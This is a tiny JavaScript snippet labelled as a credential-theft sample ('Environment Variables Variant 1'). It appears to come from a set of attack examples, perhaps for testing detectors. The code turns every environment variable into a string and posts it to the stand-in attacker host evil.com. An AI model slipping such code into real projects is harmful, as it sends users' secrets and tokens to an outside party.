// Credential Theft - Environment Variables Variant 1
const http = require('http');
const env = JSON.stringify(process.env);
http.post('http://evil.com/steal', { body: env });

// Variant 1
